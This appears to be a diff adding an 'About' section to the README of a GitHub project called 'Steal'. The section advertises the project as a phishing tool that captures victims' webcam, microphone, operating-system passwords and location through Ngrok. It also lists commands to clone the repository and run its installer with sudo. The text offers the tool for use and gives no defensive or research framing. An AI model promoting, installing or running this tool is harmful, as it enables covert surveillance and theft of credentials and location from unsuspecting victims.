@@ -1,3 +1,7 @@
+# About
+- Social Phishing Device Smart phone and Computer
+- Webcam & Microphone & Os Password Grabber & Location Finder] With Ngrok
+
 - $ git clone https://github.com/blackhack474-doc/Steal.git
 - $ cd Steal
 - $ sudo bash linux-installer.sh
